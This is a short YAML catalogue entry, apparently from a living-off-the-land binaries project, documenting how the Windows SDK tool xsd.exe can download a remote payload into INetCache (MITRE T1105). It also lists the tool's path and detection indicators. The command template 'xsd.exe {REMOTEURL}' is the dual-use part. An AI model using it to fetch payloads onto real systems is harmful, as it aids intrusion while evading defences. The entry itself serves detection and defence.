---
Name: xsd.exe
Description: XML Schema Definition Tool included with the Windows Software Development Kit (SDK).
Author: Avihay Eldad
Created: 2024-04-09
Commands:
  - Command: xsd.exe {REMOTEURL}
    Description: Downloads payload from remote server
    Usecase: It will download a remote payload and place it in INetCache
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
    Tags:
      - Download: INetCache
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe
Detection:
  - IOC: URL on a xsd.exe command line
  - IOC: xsd.exe making unexpected network connections or DNS requests
Acknowledgement:
  - Person: Avihay Eldad
    Handle: '@AvihayEldad'
---
